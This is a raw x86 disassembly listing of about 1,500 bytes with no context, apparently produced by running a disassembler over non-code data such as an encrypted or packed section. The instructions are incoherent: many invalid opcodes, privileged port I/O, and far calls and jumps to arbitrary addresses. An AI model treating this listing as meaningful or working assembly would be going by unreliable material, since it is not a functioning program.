  41e8ba:	(bad)  
  41e8bc:	mov    al,ds:0x5914be6e
  41e8c1:	and    al,0xbc
  41e8c3:	xchg   ecx,eax
  41e8c4:	sbb    al,0x9f
  41e8c6:	push   ebp
  41e8c7:	fild   DWORD PTR [eax+0xfe45c87]
  41e8cd:	retf   
  41e8ce:	fmul   st(4),st
  41e8d0:	and    eax,DWORD PTR [esi+0x19c890f2]
  41e8d6:	xor    BYTE PTR [ecx+eax*8],cl
  41e8d9:	cmp    BYTE PTR [edx],0xe9
  41e8dc:	add    al,BYTE PTR [ecx]
  41e8de:	inc    edx
  41e8df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e8e0:	loopne 0x41e88d
  41e8e2:	les    edi,FWORD PTR [eax+0x34]
  41e8e5:	js     0x41e8ac
  41e8e7:	mov    ah,0xb0
  41e8e9:	and    al,0xcc
  41e8eb:	push   ebx
  41e8ec:	inc    eax
  41e8ed:	or     eax,DWORD PTR [ecx+ebp*8]
  41e8f0:	lock inc esi
  41e8f2:	ds cdq 
  41e8f4:	mov    ah,0xa5
  41e8f6:	xlat   BYTE PTR ds:[ebx]
  41e8f7:	jnp    0x41e973
  41e8f9:	(bad)  
  41e8fb:	or     al,0xa3
  41e8fd:	lea    edi,[edx]
  41e8ff:	push   ds
  41e900:	push   cs
  41e901:	pop    ebp
  41e902:	sar    DWORD PTR [edx],cl
  41e904:	sbb    bl,BYTE PTR [edi]
  41e906:	add    DWORD PTR [edx-0x16f943ea],ecx
  41e90c:	push   ecx
  41e90d:	xor    cl,BYTE PTR [ebp-0x1dcdaf1d]
  41e913:	adc    ebp,DWORD PTR [eax]
  41e915:	push   0xffffff9a
  41e917:	and    BYTE PTR [edi+0x32dfbeb9],0x79
  41e91e:	in     al,dx
  41e91f:	pop    ds
  41e920:	ss bnd jnp 0x41e91d
  41e924:	xor    DWORD PTR [esi],esp
  41e926:	cmp    al,0x83
  41e928:	(bad)  
  41e929:	test   eax,0x5b6f834
  41e92e:	dec    ebx
  41e92f:	push   ecx
  41e930:	ret    
  41e931:	dec    edi
  41e932:	mov    al,0x24
  41e934:	push   edx
  41e935:	or     ebp,DWORD PTR [ecx]
  41e937:	cmp    al,0x69
  41e939:	dec    eax
  41e93a:	lahf   
  41e93b:	psubb  mm1,mm6
  41e93e:	cmc    
  41e93f:	pushf  
  41e940:	inc    ebp
  41e941:	cmp    eax,0x195f0b1
  41e946:	rol    DWORD PTR [esp+esi*1-0x7e],cl
  41e94a:	sahf   
  41e94b:	mov    WORD PTR [edi],?
  41e94d:	test   al,0xe0
  41e94f:	xchg   edi,eax
  41e950:	sub    DWORD PTR [esp+eax*2],0xffffffe0
  41e954:	aas    
  41e955:	shr    ecx,0x7d
  41e958:	enter  0x53a0,0xaf
  41e95c:	or     al,0xa0
  41e95e:	push   eax
  41e95f:	or     eax,DWORD PTR [ebx]
  41e961:	call   0xd1b:0xda9f84a1
  41e968:	lods   al,BYTE PTR ds:[esi]
  41e969:	cli    
  41e96a:	int3   
  41e96b:	(bad)  
  41e96c:	call   0xfb7c6685
  41e971:	add    BYTE PTR [ecx],ch
  41e973:	popf   
  41e974:	aam    0x1f
  41e976:	aas    
  41e977:	jne    0x41e9d7
  41e979:	xchg   ebp,eax
  41e97a:	fnsave [edx]
  41e97c:	fcompp 
  41e97e:	(bad)  
  41e97f:	into   
  41e980:	cli    
  41e981:	test   al,0xdc
  41e983:	and    BYTE PTR [ebx+edi*1+0x51],dh
  41e987:	bound  edx,QWORD PTR [ebx]
  41e989:	push   esp
  41e98a:	jmp    0x4c9240a2
  41e98f:	adc    eax,0xe152febd
  41e994:	push   0xfffffff7
  41e996:	cmp    al,0xe0
  41e998:	call   0x6b57e2a0
  41e99d:	pop    ebp
  41e99e:	mov    dh,cl
  41e9a0:	xor    esp,DWORD PTR [edx+0x2b]
  41e9a3:	xor    DWORD PTR ds:0x3285b9a,ebx
  41e9a9:	or     DWORD PTR [eax-0x33],ecx
  41e9ac:	mov    DWORD PTR [edx+0x26f8a705],ecx
  41e9b2:	dec    ebx
  41e9b3:	fiadd  WORD PTR ds:0xb74e33f4
  41e9b9:	mov    edi,ebp
  41e9bb:	mov    DWORD PTR [ecx-0x67bf43d3],esi
  41e9c1:	push   es
  41e9c2:	test   ecx,edi
  41e9c4:	or     eax,0x4a088595
  41e9c9:	pop    ecx
  41e9ca:	imul   edi,DWORD PTR [ebx-0x60],0xcbcc2ee4
  41e9d1:	mov    ebp,0xea7c4055
  41e9d6:	xchg   ebx,eax
  41e9d7:	jno    0x41ea37
  41e9d9:	and    DWORD PTR [ebx],esp
  41e9db:	or     al,0xe3
  41e9dd:	add    DWORD PTR [ebp-0x21],0x72
  41e9e1:	push   esi
  41e9e2:	xchg   edx,eax
  41e9e3:	sti    
  41e9e4:	in     al,dx
  41e9e5:	or     bh,BYTE PTR [esi+edx*2]
  41e9e8:	pop    eax
  41e9e9:	jmp    0xf15f9234
  41e9ee:	jno    0x41ea42
  41e9f0:	(bad)  
  41e9f1:	loop   0x41ea18
  41e9f3:	pop    ds
  41e9f4:	dec    ebp
  41e9f5:	xchg   esi,eax
  41e9f6:	inc    ebx
  41e9f7:	shl    BYTE PTR [esi],cl
  41e9f9:	in     al,0xbc
  41e9fb:	add    DWORD PTR [ebp-0xbbf8099],ecx
  41ea01:	inc    edi
  41ea02:	dec    edx
  41ea03:	pushf  
  41ea04:	stos   DWORD PTR es:[edi],eax
  41ea05:	mov    bl,0xbc
  41ea07:	adc    al,0x2e
  41ea09:	enter  0x6c1c,0xbd
  41ea0d:	jmp    0x41e9d9
  41ea0f:	or     DWORD PTR [edx],ecx
  41ea11:	sub    edi,DWORD PTR [edi+0x76]
  41ea14:	scas   eax,DWORD PTR es:[edi]
  41ea15:	jle    0x41ea22
  41ea17:	inc    edx
  41ea18:	ss xchg ecx,eax
  41ea1a:	test   DWORD PTR [esi+0x75e4412a],0x95342525
  41ea24:	sbb    al,dh
  41ea26:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea28:	(bad)  
  41ea29:	call   0x92be:0xcb199f01
  41ea30:	push   ss
  41ea31:	sbb    edi,edx
  41ea33:	das    
  41ea34:	enter  0x9816,0x70
  41ea38:	je     0x41ea86
  41ea3a:	xchg   edi,eax
  41ea3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea3c:	mov    cl,0x15
  41ea3e:	inc    eax
  41ea3f:	test   dh,0x1e
  41ea42:	cld    
  41ea43:	add    esi,DWORD PTR [ecx-0x7]
  41ea46:	add    al,BYTE PTR [edx]
  41ea48:	fwait
  41ea49:	retf   
  41ea4a:	inc    edx
  41ea4b:	push   ebp
  41ea4c:	stos   BYTE PTR es:[edi],al
  41ea4d:	lahf   
  41ea4e:	sub    al,0xc5
  41ea50:	std    
  41ea51:	pop    edi
  41ea52:	dec    eax
  41ea53:	fstp   TBYTE PTR [ecx+0x3592f2af]
  41ea59:	shl    esi,0x59
  41ea5c:	fdiv   DWORD PTR [ecx-0x8]
  41ea5f:	inc    ebx
  41ea60:	dec    eax
  41ea61:	(bad)  
  41ea62:	mov    esi,0xcf708f9f
  41ea67:	ss pop ecx
  41ea69:	sub    DWORD PTR [edx-0x72],edi
  41ea6c:	ins    BYTE PTR es:[edi],dx
  41ea6d:	lahf   
  41ea6e:	pop    ebx
  41ea6f:	jb     0x41ea4f
  41ea71:	loope  0x41ea99
  41ea73:	mov    esp,0xdd3da0b8
  41ea78:	shr    BYTE PTR [edx],1
  41ea7a:	jg     0x41ea47
  41ea7c:	xor    ah,BYTE PTR [ecx-0x242a40bb]
  41ea82:	(bad)
  41ea85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea86:	sub    al,0x14
  41ea88:	adc    ch,BYTE PTR ds:0x7fcb01bb
  41ea8e:	add    eax,0x7de85aa1
  41ea93:	jl     0x41ea8d
  41ea95:	repz lock (bad) 
  41ea98:	xchg   ecx,eax
  41ea99:	lock mov cl,0x63
  41ea9c:	xchg   BYTE PTR [ecx],al
  41ea9e:	int3   
  41ea9f:	and    edx,DWORD PTR [ebp-0x41]
  41eaa2:	mov    dl,0x71
  41eaa4:	call   0x395d:0x5342a21c
  41eaab:	inc    esp
  41eaac:	loopne 0x41eace
  41eaae:	cwde   
  41eaaf:	and    eax,0x790b09eb
  41eab4:	popf   
  41eab5:	add    al,0xb7
  41eab7:	(bad)  
  41eab8:	aad    0x58
  41eaba:	pop    si
  41eabc:	dec    ebx
  41eabd:	stos   DWORD PTR es:[edi],eax
  41eabe:	xchg   esp,eax
  41eabf:	cmp    BYTE PTR [edi+0x4ed9e3ec],ch
  41eac5:	push   eax
  41eac6:	mov    edi,0xca76effb
  41eacb:	ja     0x41ea50
  41eacd:	aam    0x9
  41eacf:	pushf  
  41ead0:	mov    ebp,0xbe6c5255
  41ead5:	int3   
  41ead6:	mov    ebx,0x1b96cecd
  41eadb:	sahf   
  41eadc:	nop
  41eadd:	fild   QWORD PTR [ebp+0x7c860309]
  41eae3:	jns    0x41ea6d
  41eae5:	fst    DWORD PTR ds:0x69d30c0e
  41eaeb:	sbb    esp,edx
  41eaed:	in     al,0xb6
  41eaef:	jecxz  0x41ea9b
  41eaf1:	dec    ebx
  41eaf2:	imul   ebp,DWORD PTR [edx-0x6f],0x6bb7416d
  41eaf9:	(bad)  
  41eafc:	(bad)  
  41eafd:	and    edi,DWORD PTR [ecx]
  41eaff:	mov    ds:0xa3eeeb17,al
  41eb04:	hlt    
  41eb05:	dec    esp
  41eb06:	repnz es push ebx
  41eb09:	fidiv  WORD PTR [ecx-0x67]
  41eb0c:	fidivr DWORD PTR [eax+0x0]
  41eb0f:	add    eax,0xe3d9ddcc
  41eb14:	ds jge 0x41eaec
  41eb17:	mov    ch,0xa1
  41eb19:	out    0x49,al
  41eb1b:	cld    
  41eb1c:	add    ah,cl
  41eb1e:	mov    edx,0x3cc2dbf1
  41eb23:	das    
  41eb24:	(bad)  
  41eb25:	push   cs
  41eb26:	pop    eax
  41eb28:	rol    cl,cl
  41eb2a:	lahf   
  41eb2b:	cmp    edi,DWORD PTR [edx]
  41eb2d:	add    dl,BYTE PTR [esi]
  41eb2f:	adc    BYTE PTR [ebp-0x654ae3b3],cl
  41eb35:	lods   eax,DWORD PTR ds:[esi]
  41eb36:	sub    eax,0x5aad9175
  41eb3b:	test   DWORD PTR [ebx],ebx
  41eb3d:	mov    esi,0xfd16fe73
  41eb42:	scas   al,BYTE PTR es:[edi]
  41eb43:	push   esi
  41eb44:	sahf   
  41eb45:	sub    edx,DWORD PTR [esi+esi*4-0x3a]
  41eb49:	add    eax,0x370cd9a6
  41eb4e:	in     al,0x1a
  41eb50:	mov    WORD PTR [eax+edx*2],?
  41eb53:	test   BYTE PTR [esi],cl
  41eb55:	sbb    al,0xf4
  41eb57:	jp     0x41eb47
  41eb59:	popa   
  41eb5a:	cmp    ch,BYTE PTR [ebx-0x64497869]
  41eb60:	pop    edx
  41eb61:	aam    0x1d
  41eb63:	cmp    al,0x43
  41eb65:	scas   al,BYTE PTR es:[edi]
  41eb66:	jmp    0x6eba2fa9
  41eb6b:	ret    0xedc7
  41eb6e:	nop    DWORD PTR [esi-0x130ca586]
  41eb75:	add    DWORD PTR [esp+ebx*4],0xffffff8c
  41eb79:	mov    ds:0x470c4c63,al
  41eb7e:	ins    BYTE PTR es:[edi],dx
  41eb7f:	fsubr  QWORD PTR ds:0xa0a256b2
  41eb85:	jns    0x41eb9a
  41eb87:	push   esi
  41eb88:	add    BYTE PTR [ecx-0x1],cl
  41eb8b:	loope  0x41eb40
  41eb8d:	test   eax,0x4387fa38
  41eb92:	test   eax,0x1e2bab38
  41eb97:	jp     0x41eb63
  41eb99:	adc    al,0xef
  41eb9b:	xchg   ecx,eax
  41eb9c:	icebp  
  41eb9d:	sub    BYTE PTR [ebx-0x74],ah
  41eba0:	(bad)  
  41eba1:	and    DWORD PTR [ebx-0x27a09657],ebp
  41eba7:	cmp    al,BYTE PTR [ebx]
  41eba9:	push   es
  41ebaa:	mov    eax,0x42982004
  41ebaf:	aaa    
  41ebb0:	stos   DWORD PTR es:[edi],eax
  41ebb1:	dec    esp
  41ebb2:	(bad)  
  41ebb3:	js     0x41ec00
  41ebb5:	ror    bh,0xc9
  41ebb8:	aam    0x30
  41ebba:	xor    al,0x39
  41ebbc:	mov    ds:0xe86b1cb3,al
  41ebc1:	aas    
  41ebc2:	mov    esp,0x2ea00456
  41ebc7:	xlat   BYTE PTR ds:[ebx]
  41ebc8:	adc    al,0xb3
  41ebca:	xor    DWORD PTR ds:0x2f7990e5,edx
  41ebd0:	js     0x41ec05
  41ebd2:	cmp    DWORD PTR [ebx-0x1cda2a70],0xffffffdf
  41ebd9:	fild   QWORD PTR [ebx]
  41ebdb:	push   ss
  41ebdc:	push   cs
  41ebdd:	sbb    esi,DWORD PTR ds:[ebx]
  41ebe0:	call   0x3599:0xcc35d9e2
  41ebe7:	sbb    ebx,ebp
  41ebe9:	and    al,0x29
  41ebeb:	xor    eax,0xc7ca534c
  41ebf0:	or     eax,esp
  41ebf2:	xor    al,0xac
  41ebf4:	test   al,0x9d
  41ebf6:	mov    BYTE PTR [edx+0x64d6b389],ah
  41ebfc:	pop    es
  41ebfd:	xchg   esi,eax
  41ebfe:	push   eax
  41ebff:	repnz adc al,0x9b
  41ec02:	pop    ecx
  41ec03:	xor    ebp,DWORD PTR [edx-0x5d]
  41ec06:	pop    eax
  41ec07:	or     BYTE PTR [edx-0x2a7a08fa],bl
  41ec0d:	popf   
  41ec0e:	cmp    al,0x58
  41ec10:	jo     0x41ebe8
  41ec12:	mov    ah,0x7e
  41ec14:	fisttp WORD PTR [edx+0x44473a0e]
  41ec1a:	mov    eax,ds:0x30456065
  41ec1f:	scas   eax,DWORD PTR es:[edi]
  41ec20:	xor    eax,0x55f6a31
  41ec25:	repnz shr al,0xc2
  41ec29:	scas   eax,DWORD PTR es:[edi]
  41ec2a:	stos   DWORD PTR es:[edi],eax
  41ec2b:	jecxz  0x41ebcf
  41ec2d:	mov    dh,BYTE PTR [ebx+0x1a]
  41ec30:	popa   
  41ec31:	push   ecx
  41ec32:	out    0x12,al
  41ec34:	repz adc al,0x36
  41ec37:	xchg   edi,eax
  41ec38:	fs jg  0x41ec4c
  41ec3b:	mul    DWORD PTR [ebx-0x76]
  41ec3e:	mov    ecx,0xc2a91bfa
  41ec43:	push   ebx
  41ec44:	mov    al,0x2e
  41ec46:	(bad)  
  41ec47:	hlt    
  41ec48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec49:	mov    edx,DWORD PTR [ecx+0x1c]
  41ec4c:	nop
  41ec4d:	xlat   BYTE PTR ds:[ebx]
  41ec4e:	cli    
  41ec4f:	jne    0x41ebf5
  41ec51:	mov    DWORD PTR es:[ebx],eax
  41ec54:	out    dx,al
  41ec55:	jns    0x41ebf3
  41ec57:	shl    bh,1
  41ec59:	cmp    eax,0x4f3fabc3
  41ec5e:	inc    ebx
  41ec5f:	pop    ss
  41ec60:	xchg   ecx,eax
  41ec61:	icebp  
  41ec62:	ret    0x8d5c
  41ec65:	cli    
  41ec66:	xchg   ebp,eax
  41ec67:	pop    eax
  41ec68:	dec    edx
  41ec69:	in     eax,dx
  41ec6a:	inc    eax
  41ec6b:	mov    ah,0xb7
  41ec6d:	jae    0x41ec26
  41ec6f:	add    eax,0xab288656
  41ec74:	and    cl,BYTE PTR [ebp+0x1d]
  41ec77:	mov    ebx,0x1180ce95
  41ec7c:	ds sub al,0x58
  41ec7f:	call   0x79:0x7cbec8f6
  41ec86:	push   esp
  41ec87:	test   BYTE PTR [esi-0x23],dh
  41ec8a:	mov    ch,0x9f
  41ec8c:	xchg   BYTE PTR [ebx],cl
  41ec8e:	enter  0xf6d,0x5d
  41ec92:	inc    esi
  41ec93:	ins    DWORD PTR es:[edi],dx
  41ec94:	xor    BYTE PTR [ebx+eiz*2-0x65],ah
  41ec98:	jmp    0x937d:0x2000e5bd
  41ec9f:	adc    DWORD PTR [ecx],ebx
  41eca1:	loopne 0x41ecb6
  41eca3:	pop    ebp
  41eca4:	lea    eax,ss:[ecx+0x58c2f33f]
  41ecab:	inc    edi
  41ecac:	dec    ebp
  41ecad:	add    BYTE PTR [edx],bl
  41ecaf:	add    dh,BYTE PTR ds:0xf56f6a56
  41ecb5:	jecxz  0x41ecbc
  41ecb7:	call   0x9ef04917
  41ecbc:	pusha  
  41ecbd:	sbb    eax,0x42737bc0
  41ecc2:	popa   
  41ecc3:	push   esi
  41ecc4:	call   0x637f:0xd355a140
  41eccb:	loope  0x41ed02
  41eccd:	cmp    ebp,0xc79101ff
  41ecd3:	xchg   eax,ebp
  41ecd5:	hlt    
  41ecd6:	out    dx,al
  41ecd7:	inc    ebp
  41ecd8:	mov    esp,0x7fa8bcb6
  41ecdd:	fldenv [edi-0x38ef74ca]
  41ece3:	shr    DWORD PTR [eax+0x4ad5c254],1
  41ece9:	out    0x64,al
  41eceb:	outs   dx,DWORD PTR ds:[esi]
  41ecec:	cmp    DWORD PTR [ecx+0x4f],ecx
  41ecef:	repz mov ah,0xc
  41ecf2:	neg    BYTE PTR [esp+edx*8+0x29]
  41ecf6:	mov    ch,0x96
  41ecf8:	dec    ecx
  41ecf9:	jecxz  0x41ec80
  41ecfb:	mov    BYTE PTR [ebx+0x623f9af8],dl
  41ed01:	call   0x88abcd7
  41ed06:	popa   
  41ed07:	mov    ds,WORD PTR [eax-0x23]
  41ed0a:	mov    ch,0x3d
  41ed0c:	aaa    
  41ed0d:	enter  0x8295,0x88
  41ed11:	mov    bl,0x30
  41ed13:	xchg   edx,eax
  41ed14:	push   0x31
  41ed16:	clc    
  41ed17:	jmp    0x41ecd5
  41ed19:	outs   dx,DWORD PTR ds:[esi]
  41ed1a:	fs into 
  41ed1c:	and    al,dh
  41ed1e:	push   cs
  41ed1f:	das    
  41ed20:	sti    
  41ed21:	(bad)  
  41ed22:	fcomp  QWORD PTR [ebx+ebp*2-0x18]
  41ed26:	cmp    DWORD PTR [eax+eax*8-0x343ef9f8],0x7f3c1868
  41ed31:	push   ebx
  41ed32:	lahf   
  41ed33:	add    BYTE PTR [ecx-0x5a0055f5],bh
  41ed39:	push   es
  41ed3a:	pushf  
  41ed3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed3c:	sbb    eax,0xcca8420e
  41ed41:	stc    
  41ed42:	inc    esi
  41ed43:	sbb    DWORD PTR ds:[edx],ebp
  41ed46:	xor    eax,0x69289031
  41ed4b:	inc    edi
  41ed4c:	jp     0x41ed62
  41ed4e:	pop    esi
  41ed4f:	and    ch,ch
  41ed51:	jmp    0x41ed6e
  41ed53:	lods   al,BYTE PTR ds:[esi]
  41ed54:	int    0x6d
  41ed56:	jno    0x41ed8f
  41ed58:	lea    ebp,[ecx]
  41ed5a:	ror    BYTE PTR [ebp-0x40],cl
  41ed5d:	inc    esp
  41ed5e:	xor    edx,esi
  41ed60:	sbb    al,0x9a
  41ed62:	xchg   esi,eax
  41ed63:	ss mov eax,ds
  41ed66:	xchg   ecx,eax
  41ed67:	jbe    0x41ed73
  41ed69:	cmp    dh,0x87
  41ed6c:	jnp    0x41ed5f
  41ed6e:	sub    ecx,DWORD PTR [ecx+0x65]
  41ed71:	int    0x8d
  41ed73:	or     al,0xbf
  41ed75:	inc    ebp
  41ed76:	cmp    bh,BYTE PTR [eax-0x5b]
  41ed79:	add    al,0x44
  41ed7b:	push   ss
  41ed7c:	jle    0x41ed86
  41ed7e:	pop    ds
  41ed7f:	xchg   ebx,eax
  41ed80:	xor    BYTE PTR [edi],cl
  41ed82:	jno    0x41edef
  41ed84:	cmp    eax,0xa4b58f6f
  41ed89:	into   
  41ed8a:	mov    al,ds:0x8f92334c
  41ed8f:	pop    ebx
  41ed90:	cdq    
  41ed91:	xor    DWORD PTR [eax],ebx
  41ed93:	lahf   
  41ed94:	dec    edx
  41ed95:	push   0x6a2a9a7f
  41ed9a:	mov    eax,0x3809c82f
  41ed9f:	sbb    DWORD PTR [esi-0x65f53f2],edi
  41eda5:	sbb    al,0xe6
  41eda7:	fistp  QWORD PTR [ebx]
  41eda9:	lahf   
  41edaa:	pusha  
  41edab:	push   ds
  41edac:	call   0xb52cebb6
  41edb1:	cmp    eax,ebp
  41edb3:	jg     0x41ed71
  41edb5:	jnp    0x41ed3b
  41edb7:	pop    ebp
  41edb9:	in     al,dx
  41edba:	xchg   edx,eax
  41edbb:	jne    0x41eda0
  41edbd:	push   ds
  41edbe:	and    al,0x33
  41edc0:	out    dx,eax
  41edc1:	push   ebp
  41edc2:	push   eax
  41edc3:	cmp    al,0xc5
  41edc5:	sub    eax,0xd2f968e1
  41edca:	xchg   ebp,eax
  41edcb:	gs test eax,0xfaa38825
  41edd1:	push   eax
  41edd2:	add    BYTE PTR [ebx-0x46d2623a],ah
  41edd8:	or     eax,0xa1472b00
  41eddd:	and    esi,ecx
  41eddf:	mov    ecx,0x75564c1a
  41ede4:	ins    DWORD PTR es:[edi],dx
  41ede5:	push   ecx
  41ede6:	xchg   esp,eax
  41ede7:	lahf   
  41ede8:	push   ebp
  41ede9:	aad    0x15
  41edeb:	(bad)  
  41eded:	pop    edx
  41edee:	rcr    bl,cl
  41edf0:	mov    gs,WORD PTR [esi+0x540280dd]
  41edf6:	in     eax,0x3e
  41edf8:	pusha  
  41edf9:	add    ebx,DWORD PTR [edi+0x4d]
  41edfc:	or     ebx,DWORD PTR [ebp-0x39fc30a8]
  41ee02:	pop    esp
  41ee03:	lods   al,BYTE PTR ds:[esi]
  41ee04:	mov    ebp,0x7b7bfc8
  41ee09:	and    DWORD PTR [eax],ecx
  41ee0b:	xor    eax,0x683d8c1d
  41ee10:	mov    eax,ds:0x1ca9e431
  41ee15:	shr    BYTE PTR [ecx+0x7506b59c],1
  41ee1b:	mov    dl,0xdb
  41ee1d:	cmp    eax,0xbdf36db8
  41ee22:	push   0x49d9973
  41ee27:	inc    esp
  41ee28:	jl     0x41ee3a
  41ee2a:	dec    esi
  41ee2b:	imul   DWORD PTR [edx]
  41ee2d:	out    0x95,eax
  41ee2f:	fstp   QWORD PTR [esi-0x59]
  41ee32:	cmp    esi,DWORD PTR [ebx-0x42]
  41ee35:	hlt    
  41ee36:	retf   0x335c
  41ee39:	xor    al,0x4b
  41ee3b:	fwait
  41ee3c:	les    esi,FWORD PTR [esi+eax*2-0x35]
  41ee40:	sbb    al,0x4e
  41ee42:	inc    esi
  41ee43:	aas    
  41ee44:	xchg   esp,esi
  41ee46:	push   ebx
  41ee47:	dec    edx
  41ee48:	mov    esi,0xed01d333
  41ee4d:	cs loopne 0x41ee1f
  41ee50:	and    esi,DWORD PTR [ebx+edx*2-0x27]
  41ee54:	sbb    al,0x71
  41ee56:	bound  esi,QWORD PTR [ecx-0x7919e695]
  41ee5c:	adc    al,0x78
  41ee5e:	icebp  
  41ee5f:	test   al,0x1a
  41ee61:	push   eax
  41ee62:	sub    eax,0x74b2196d
  41ee67:	cwde   
  41ee68:	fs repz mov ebx,0xd714ff4f
  41ee6f:	pop    eax
  41ee70:	or     BYTE PTR [ebx+0x18],bl
  41ee73:	cmp    ebx,ecx
  41ee75:	mov    BYTE PTR ds:0x5fc7a23d,ch
  41ee7b:	or     dh,cl
  41ee7d:	ja     0x41eecf
  41ee7f:	adc    al,0x3b
  41ee81:	cld    
  41ee82:	(bad)  
  41ee83:	and    esi,DWORD PTR [ebx]
  41ee85:	bnd jp 0x41ee67
  41ee88:	sub    al,0xab
  41ee8a:	test   DWORD PTR [edi-0x7d],esp
  41ee8d:	mov    ch,0x89
  41ee8f:	sub    eax,DWORD PTR [eax-0x597c03fb]
  41ee95:	jl     0x41eea0
  41ee97:	push   cs
  41ee98:	gs in  al,0x19
  41ee9b:	pop    es
  41ee9c:	jbe    0x41eec0
  41ee9e:	jns    0x41eeee
  41eea0:	into   
  41eea1:	sub    DWORD PTR [ebx+0x7a9ae715],edx
  41eea7:	add    eax,0xd8e8f00e
  41eeac:	hlt    
  41eead:	sbb    BYTE PTR [ebx-0x2b],ah
  41eeb0:	les    edx,FWORD PTR [ecx+0x30]
  41eeb3:	pusha  
  41eeb4:	sbb    dl,BYTE PTR [ebx]
  41eeb6:	xor    al,0x79
  41eeb8:	fist   WORD PTR [esi+eiz*1]
  41eebb:	sub    edx,0x649fb887
  41eec1:	adc    DWORD PTR [ecx+0x7f5c1272],esi
  41eec7:	mov    ch,0xfc
  41eec9:	imul   esi,DWORD PTR [edx+0x58],0x820b104
  41eed0:	int    0x73
  41eed2:	push   ds
  41eed3:	mov    edx,0x252cfe3a
  41eed8:	jl     0x41eef6
  41eeda:	jns    0x41ee96
  41eedc:	cwde   
  41eedd:	mov    eax,0xb9993469
  41eee2:	scas   al,BYTE PTR es:[edi]
  41eee3:	or     al,0x34
  41eee5:	jae    0x41ee78
  41eee7:	leave  
  41eee8:	mov    cl,0xc1
  41eeea:	mov    esp,0xb2a63724
  41eeef:	xor    al,0xcf
  41eef1:	inc    edi
  41eef2:	pusha  
  41eef3:	imul   esp,DWORD PTR ds:0xeaa1a74e,0x28
  41eefa:	sti    
  41eefb:	jnp    0x41ef3d
  41eefd:	mov    dl,0x12
  41eeff:	retf   0x1ca9
  41ef02:	xor    ch,bh
  41ef04:	mov    al,0x97
  41ef06:	pop    esi
  41ef07:	nop
  41ef08:	sbb    DWORD PTR [eax-0x6d4859e6],0x939f201c
  41ef12:	ret    
  41ef13:	fidiv  DWORD PTR [esi]
  41ef15:	aaa    
  41ef16:	mov    bl,0x10
  41ef18:	push   ds
  41ef19:	ror    BYTE PTR [eax-0x5d649556],0x56
  41ef20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef21:	lea    edi,gs:[ebx-0x2c]
  41ef25:	lds    ecx,FWORD PTR [ebx-0x5e]
  41ef28:	icebp  
  41ef29:	pop    ds
  41ef2a:	mov    ebp,0x7bb5acbc
  41ef2f:	call   0x523501c7
  41ef34:	out    0x8b,eax
  41ef36:	outs   dx,BYTE PTR ds:[esi]
  41ef37:	mov    bl,0x36
  41ef39:	pop    es
  41ef3a:	cmp    BYTE PTR [esi],bl
  41ef3c:	aas    
  41ef3d:	lds    edi,FWORD PTR ds:0x3f542a48
  41ef43:	xchg   edx,eax
  41ef44:	ins    DWORD PTR es:[edi],dx
  41ef45:	cmc    
  41ef46:	imul   edx,DWORD PTR [ecx-0x37],0x9ab71fdf
  41ef4d:	pandn  mm5,QWORD PTR [ebp-0x3f52e5bf]
  41ef54:	lods   eax,DWORD PTR ds:[esi]
  41ef55:	sub    cl,bh
  41ef57:	jmp    0x41ef87
  41ef59:	pop    eax
  41ef5a:	pop    ecx
  41ef5b:	xor    ebp,DWORD PTR [ebp-0x75edf75b]
  41ef61:	cli    
  41ef62:	mov    es,WORD PTR [ecx+0x5a]
  41ef65:	outs   dx,BYTE PTR ds:[esi]
  41ef66:	and    dh,cl
  41ef68:	mov    ah,0x40
  41ef6a:	mov    edx,0x594b0c3b
  41ef6f:	mov    esi,0x8197b1f0
  41ef74:	repnz lea esp,[esi+0x5737d8f2]
  41ef7b:	lahf   
  41ef7c:	adc    eax,0x3e9eb467
  41ef81:	mov    esp,DWORD PTR [eax+0x7e11ba82]
  41ef87:	test   eax,0x69029adf
  41ef8c:	(bad)  
  41ef8d:	jbe    0x41ef15
  41ef8f:	mov    ah,0xd5
  41ef91:	clc    
  41ef92:	or     BYTE PTR [ebp-0x23a9554e],dh
  41ef98:	repz xor ebx,ecx
  41ef9b:	add    DWORD PTR [edi-0x31ea6db],ebp
  41efa1:	(bad)  
  41efa2:	jmp    0xebefdf4
  41efa7:	jmp    0x41ef9e
  41efa9:	cmp    eax,0xf864ee56
  41efae:	fild   DWORD PTR [ebx+ebp*2+0x6e30706b]
  41efb5:	xlat   BYTE PTR ds:[ebx]
  41efb6:	test   DWORD PTR ds:0x8520be1b,edx
  41efbc:	lds    eax,FWORD PTR [ebp-0x21a3e84a]
  41efc2:	cld    
  41efc3:	sbb    BYTE PTR [ebx],al
  41efc5:	xor    eax,0xd89b210
  41efca:	ficom  WORD PTR [ecx-0x6edd2437]
  41efd0:	xor    cl,BYTE PTR [edi-0x3f]
  41efd3:	mov    ds:0xe5863c10,al
  41efd9:	inc    esi
  41efda:	repz push ss
  41efdc:	sbb    eax,0x5a94e7d
  41efe1:	and    eax,0x521cfb58
  41efe6:	das    
  41efe7:	dec    edx
  41efe8:	pop    esp
  41efe9:	popa   
  41efea:	pop    ebx
  41efeb:	sub    DWORD PTR [esi],0xffffffe1
  41efee:	aam    0x5
  41eff0:	mov    dh,0x28
  41eff2:	call   0x2fa57100
  41eff7:	addr16 xor ax,0x2a98
  41effc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41effd:	sahf   
  41effe:	xchg   ebx,eax
  41efff:	daa    
  41f000:	stos   BYTE PTR es:[edi],al
  41f001:	loope  0x41f00e
  41f003:	adc    DWORD PTR [edi],ecx
  41f005:	cmp    eax,edx
  41f007:	in     eax,dx
  41f008:	xor    BYTE PTR [ecx+0xc9cec92],dh
  41f00e:	sbb    eax,0x8b8ad2e7
  41f013:	mov    edi,0xb8269b02
  41f018:	dec    edi
  41f019:	std    
  41f01a:	mov    DWORD PTR [ecx],ebp
  41f01c:	jne    0x41f089
  41f01e:	stc    
  41f01f:	aaa    
  41f020:	xchg   ebx,eax
  41f021:	and    BYTE PTR [ebx+0x53],ch
  41f024:	jg     0x41efbe
  41f026:	adc    bl,BYTE PTR [edi+0x33bace3a]
  41f02c:	pop    es
  41f02d:	ds dec ebx
  41f02f:	dec    ebx
  41f030:	xor    ah,BYTE PTR [eax]
  41f032:	daa    
